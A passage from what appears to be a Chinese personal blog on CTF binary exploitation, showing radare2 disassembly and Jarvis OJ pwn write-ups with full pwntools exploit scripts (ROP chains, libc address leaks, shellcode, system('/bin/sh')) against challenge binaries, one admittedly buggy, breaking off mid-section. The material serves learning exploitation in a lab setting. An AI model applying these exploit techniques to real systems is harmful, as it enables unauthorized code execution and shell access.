class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; s main</span><br><span class="line">[0x08049203]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 65</span><br><span class="line">|   sym.main (int argc, char **argv, char **envp);</span><br><span class="line">|           ; var int local_8h @ ebp-0x8</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           ; DATA XREF from entry0 (0x80490b6)</span><br><span class="line">|           0x08049203      8d4c2404       lea ecx, [arg_4h]           ; 4</span><br><span class="line">|           0x08049207      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x0804920a      ff71fc         push dword [ecx - 4]</span><br><span class="line">|           0x0804920d      55             push ebp</span><br><span class="line">|           0x0804920e      89e5           mov ebp, esp</span><br><span class="line">|           0x08049210      53             push ebx</span><br><span class="line">|           0x08049211      51             push ecx</span><br><span class="line">|           0x08049212      e82d000000     call sym.__x86.get_pc_thunk.ax</span><br><span class="line">|           0x08049217      05e92d0000     add eax, 0x2de9</span><br><span class="line">|           0x0804921c      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x0804921f      8d9010e0ffff   lea edx, [eax - 0x1ff0]</span><br><span class="line">|           0x08049225      52             push edx                    ; const char *s</span><br><span class="line">|           0x08049226      89c3           mov ebx, eax</span><br><span class="line">|           0x08049228      e823feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0804922d      83c410         add esp, 0x10</span><br><span class="line">|           0x08049230      e898ffffff     call sym.vulnerable</span><br><span class="line">|           0x08049235      b800000000     mov eax, 0</span><br><span class="line">|           0x0804923a      8d65f8         lea esp, [local_8h]</span><br><span class="line">|           0x0804923d      59             pop ecx</span><br><span class="line">|           0x0804923e      5b             pop ebx</span><br><span class="line">|           0x0804923f      5d             pop ebp</span><br><span class="line">|           0x08049240      8d61fc         lea esp, [ecx - 4]</span><br><span class="line">\           0x08049243      c3             ret</span><br></pre></td></tr></table></figure><p>radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[0x08049203]&gt; pdc</span><br><span class="line">function sym.main () &#123;</span><br><span class="line">    //  1 basic blocks</span><br><span class="line"></span><br><span class="line">    loc_0x8049203:</span><br><span class="line"></span><br><span class="line">  //DATA XREF from entry0 (0x80490b6)</span><br><span class="line">       ecx = [arg_4h]           //4</span><br><span class="line">       esp &amp;= 0xfffffff0        //ebp</span><br><span class="line">       push dword [ecx - 4]</span><br><span class="line">       push ebp</span><br><span class="line">       ebp = esp</span><br><span class="line">       push ebx</span><br><span class="line">       push ecx</span><br><span class="line">       sym.__x86.get_pc_thunk.ax ()</span><br><span class="line">       eax += 0x2de9            //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       esp -= 0xc</span><br><span class="line">       edx = [eax - 0x1ff0]     //&quot;input&quot; str.input</span><br><span class="line">       push edx                 //const char *s ; (pstr 0x0804a010) &quot;input&quot;</span><br><span class="line">       ebx = eax                //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       </span><br><span class="line">       int puts(const char * s : (*0x804a010)0x00177fe0 = input)</span><br><span class="line">       esp += 0x10</span><br><span class="line">       sym.vulnerable ()</span><br><span class="line">       eax = 0</span><br><span class="line">       esp = [local_8h]</span><br><span class="line">       pop ecx</span><br><span class="line">       pop ebx</span><br><span class="line">                                //ebp</span><br><span class="line">       esp = [ecx - 4]          //ebp</span><br><span class="line">       return</span><br><span class="line">(break)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞</p><pre><code>.---------------------------------------------------.     | [0x8049203]                                       |     | ;-- main:                                         |     | ;-- eip:                                          |     | (fcn) sym.main 65                                 |     |   sym.main (int argc, char **argv, char **envp);  |     | ; var int local_8h @ ebp-0x8                      |     | ; arg int arg_4h @ esp+0x4                        |     | ; DATA XREF from entry0 (0x80490b6)               |     | ; 4     |     | lea ecx, [arg_4h]                                 |     | and esp, 0xfffffff0                               |     | push dword [ecx - 4]                              |     | push ebp                                          |     | mov ebp, esp                                      |     | push ebx                                          |     | push ecx                                          |     | call sym.__x86.get_pc_thunk.ax;[ga]               |     | add eax, 0x2de9                                   |     | sub esp, 0xc                                      |     | lea edx, [eax - 0x1ff0]                           |     | ; const char *s                                   |     | push edx                                          |     | mov ebx, eax                                      |     | ; int puts(const char *s)                         |     | call sym.imp.puts;[gb]                            |     | add esp, 0x10                                     |     | call sym.vulnerable;[gc]                          |     | mov eax, 0                                        |     | lea esp, [local_8h]                               |  `---------------------------------------------------&apos;                                          </code></pre><p><em>目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis OJ-pwn</title>
      <link href="/2018/09/13/jarvis-oj-pwn/"/>
      <url>/2018/09/13/jarvis-oj-pwn/</url>
      <content type="html"><![CDATA[<p><em>开始漫漫刷题之路</em></p><h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p><em>参考:<a href="&quot;https://blog.csdn.net/u011987514/article/details/68490157&quot;">借助DynELF实现无libc的漏洞利用小结</a></em></p><h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p><em>搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸<br>重新下载源文件，问题解决。。。</em></p><h2 id="信息："><a href="#信息：" class="headerlink" title="信息："></a>信息：</h2><p>漏洞函数：明显的栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7uLL);</span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)</span><br><span class="line">#sh = process(&apos;level3&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line">sys_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------# </span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1)    //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。</span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">sh.send(pay1)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line"></span><br><span class="line">#---------call system func---------------#</span><br><span class="line">sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addr</span><br><span class="line">binsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addr</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; </span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="level5-mmap-amp-amp-mprotect"><a href="#level5-mmap-amp-amp-mprotect" class="headerlink" title="level5 - mmap &amp;&amp; mprotect"></a>level5 - mmap &amp;&amp; mprotect</h1><h2 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h2><p>同level3_x64 , 假设system 和 execve 被禁用，使用mmap 及mprotect 获取shell</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先搞清楚mmap 与 mprotect：<br>mmap 就是分配堆内存的那个mmap，原函数为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys/mman.h&gt;</span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off);</span><br></pre></td></tr></table></figure><p>mprotect，给addr开始的len长度的内存修改权限，原函数为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><p>所以可以将shellcode写入bss段之类的调用mprotect函数将其可执行，然后返回地址到shellcode处即可；<br>当然也可以mmap分配一段空间然后一样的操作。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p><em>稍微有点问题。。但是找不到，莫得办法。</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh = remote(&apos;pwn2.jarvisoj.com&apos;,9884)</span><br><span class="line">sh = process(&apos;level3_x64&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------#</span><br><span class="line">sh.recv()</span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(0)    </span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">print &quot;write_addr : &quot; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">#----------to get mprotect.got and write shellcode to bss_addr------#</span><br><span class="line"></span><br><span class="line">mprotect_got_addr = write_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;mprotect&apos;]</span><br><span class="line"></span><br><span class="line">print &quot;mprotect_got_addr : &quot;+ hex(mprotect_got_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = pwn.bss()</span><br><span class="line"></span><br><span class="line">print &quot;bss_addr : &quot; + hex(bss_addr)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) </span><br><span class="line">pay2 += p64(pwn.symbols[&apos;read&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">#-------------------to write bss &amp;&amp; mprotect to .got table----------------#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_got_addr = 0x600a80</span><br><span class="line">mprotect_got_addr = 0x600a78</span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])</span><br><span class="line">pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])</span><br><span class="line">pay3 += p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.send(p64(bss_got_addr))</span><br><span class="line"></span><br><span class="line">sh.send(p64(mprotect_got_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">#---------------------------</span><br><span class="line"></span><br><span class="line">init_start = 0x4006a6</span><br><span class="line">init_end = 0x400690</span><br><span class="line"></span><br><span class="line">pay4 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay4 += p64(init_start) + &apos;bbbbbbbb&apos;</span><br><span class="line">pay4 += p64(0) #rbx</span><br><span class="line">pay4 += p64(1) #rbp</span><br><span class="line">pay4 += p64(mprotect_got_addr) </span><br><span class="line">pay4 += p64(7) #r13-&gt;rdx</span><br><span class="line">pay4 += p64(0x1000) #r14-&gt;rsi</span><br><span class="line">pay4 += p64(0x600000) #r15-&gt;rdi</span><br><span class="line"></span><br><span class="line">pay4 += p64(init_end) + &apos;bbbbbbbb&apos; </span><br><span class="line">pay4 += p64(0) + p64(1) + p64(bss_got_addr) + p64(0)  + p64(0) + p64(0)</span><br><span class="line">pay4 += p64(init_end)</span><br><span class="line"></span><br><span class="line">sh.send(pay4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level6-堆的unlink利用"><a href="#level6-堆的unlink利用" class="headerlink" title="level6 - 堆的unlink利用"></a>level6 - 堆的unlink利用</h1><p>正常的选项类型题</p><h2 id="信息-2"><a href="#信息-2" class="headerlink" title="信息"></a>信息</h2><p>main:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line"></span><br><span class="line">  alarm_func();</span><br><span class="line">  main_ptr();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = menu();</span><br><span class="line">LABEL_3:</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        list();</span><br><span class="line">        continue;</span><br><span class="line">      case 2u:</span><br><span class="line">        add();</span><br><span class="line">        continue;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        continue;</span><br><span class="line">      case 4u:</span><br><span class="line">        delete();</span><br><span class="line">        v0 = menu();</span><br><span class="line">        if ( v0 &gt; 5 )</span><br><span class="line">          goto LABEL_6;</span><br><span class="line">        goto LABEL_3;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;Bye&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">      default:</span><br><span class="line">LABEL_6:</span><br><span class="line">        puts(&quot;Invalid!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题函数：<br>delete函数未检查inuse位，可以double free，且free完并未清空指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // edx</span><br><span class="line">  int v3; // eax</span><br><span class="line"></span><br><span class="line">  if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( v0 &lt; 0 )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  v1 = dword_804A2EC;</span><br><span class="line">  if ( v0 &gt;= *(_DWORD *)dword_804A2EC )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_DWORD *)(dword_804A2EC + 4);</span><br><span class="line">  v3 = v1 + 12 * v0;</span><br><span class="line">  *(_DWORD *)(v3 + 8) = 0;</span><br><span class="line">  *(_DWORD *)(v3 + 12) = 0;</span><br><span class="line">  free(*(void **)(v3 + 16));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。</p><p>保护：（基本上不用看。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/root/pwnprac/freenote_x86&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="思路-有点迷"><a href="#思路-有点迷" class="headerlink" title="思路(有点迷)"></a>思路(有点迷)</h2><p>   首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以<br>edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即<br>刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。<br>    之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) </p><h2 id="exp（待参透）"><a href="#exp（待参透）" class="headerlink" title="exp（待参透）"></a>exp（待参透）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 